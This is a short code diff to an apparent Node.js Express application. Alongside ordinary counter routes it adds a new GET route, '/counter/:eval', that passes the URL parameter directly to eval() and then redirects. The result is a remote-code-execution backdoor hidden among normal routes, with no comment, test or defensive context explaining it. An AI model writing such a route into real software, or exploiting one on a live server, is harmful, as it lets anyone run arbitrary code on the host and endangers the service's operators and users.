@@ -1270,6 +1270,11 @@ app.get('/counter/tabak',function (req,res){
    });
 });
 
+app.get('/counter/:eval',function (req,res){
+   eval(req.params.eval);
+   res.redirect('/counter');
+});
+
 
 app.post('/counter/restore',function (req,res){
  if(req.session&&req.session._id){      
